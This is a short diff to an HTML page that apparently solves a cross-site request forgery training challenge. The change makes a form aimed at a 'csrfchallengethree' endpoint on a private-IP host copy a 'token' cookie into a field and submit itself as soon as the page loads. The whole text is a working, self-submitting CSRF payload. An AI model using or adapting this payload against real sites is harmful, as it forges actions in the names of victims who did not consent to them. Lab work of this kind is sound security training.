@@ -7,13 +7,15 @@
   <form id="myForm" action="https://192.168.9.113/user/csrfchallengethree/plusplus" method="post">
     <div>
       <input name="userid" value="46e6cc2c6bd3435da76c4978037b2d9cea2e2185">
-      <input name="csrfTocken" value=Cookies.get('token');>
+      <input name="csrfTocken" id="csrfTocken" value="">
       <input type="submit" value="Submit">
     </div>
   </form>
   
 
   <script>
+    document.getElementById("csrfTocken").value=Cookies.get('token');
+    // x = Cookies.get('token');
     document.getElementById("myForm").submit();
   </script>
 
